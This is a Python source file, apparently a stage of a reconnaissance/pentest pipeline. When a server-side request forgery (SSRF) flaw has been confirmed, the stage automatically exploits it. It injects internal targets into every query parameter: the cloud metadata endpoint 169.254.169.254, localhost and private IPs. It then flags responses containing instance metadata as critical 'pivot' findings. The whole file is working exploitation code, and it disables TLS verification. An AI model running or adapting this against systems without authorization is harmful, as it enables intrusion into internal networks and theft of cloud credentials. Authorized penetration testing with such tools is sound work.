from __future__ import annotations

import httpx
from typing import Dict, List, Any
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stage_base import Stage


class SSRFPivotStage(Stage):
    """
    Elite SSRF-to-Internal Pivot Stage.
    When an SSRF is confirmed, this stage automatically uses it to probe 
    internal infrastructure (Metadata, Localhost, Internal IPs).
    """
    name = "ssrf_pivot"

    INTERNAL_PROBES = [
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080",
        "http://10.0.0.1",
        "http://172.17.0.1"
    ]

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(getattr(context.runtime_config, "enable_ssrf_pivot", True))

    async def run_async(self, context: PipelineContext) -> None:
        findings = context.get_results()
        # Find verified SSRF vulnerabilities
        verified_ssrf = [f for f in findings if f.get("finding_type") == "ssrf" and f.get("confidence_label") == "verified"]
        
        if not verified_ssrf:
            return

        context.logger.info("Found %d confirmed SSRF(s). Starting internal pivoting...", len(verified_ssrf))
        
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for ssrf in verified_ssrf:
                url = ssrf.get("url")
                if not url: continue
                
                await self._pivot_internal(context, client, url)

    async def _pivot_internal(self, context: PipelineContext, client: httpx.AsyncClient, url: str) -> None:
        for probe in self.INTERNAL_PROBES:
            test_url = self._inject_probe(url, probe)
            try:
                resp = await client.get(test_url)
                # Heuristic: If we get a 200 or a specific metadata response, it's a hit!
                if resp.status_code == 200:
                    if "ami-id" in resp.text or "instance-id" in resp.text or "localhost" in resp.text:
                        self._report_pivot(context, url, probe, resp.text[:500])
            except Exception: pass

    def _inject_probe(self, url: str, probe: str) -> str:
        parsed = urlparse(url)
        params = parse_qsl(parsed.query, keep_blank_values=True)
        # Assuming the SSRF was in a parameter, we inject the probe into all of them
        updated = [(k, probe) for k, _ in params]
        return urlunparse(parsed._replace(query=urlencode(updated)))

    def _report_pivot(self, context: PipelineContext, url: str, probe: str, snippet: str) -> None:
        finding = {
            "type": "finding",
            "finding_type": "ssrf_internal_pivot",
            "source": self.name,
            "url": url,
            "hostname": urlparse(url).hostname,
            "description": f"Confirmed SSRF Pivot to Internal Asset: {probe}",
            "severity": "critical",
            "score": 100,
            "details": {"probe": probe, "snippet": snippet},
            "tags": ["ssrf", "pivot", "internal", "confirmed"]
        }
        context.results.append(finding)
        context.emit_signal("ssrf_pivot_success", "url", url, confidence=1.0, source=self.name, evidence={"probe": probe})
        context.logger.info("🚨 SSRF Pivot SUCCESS: Found %s via %s", probe, url)
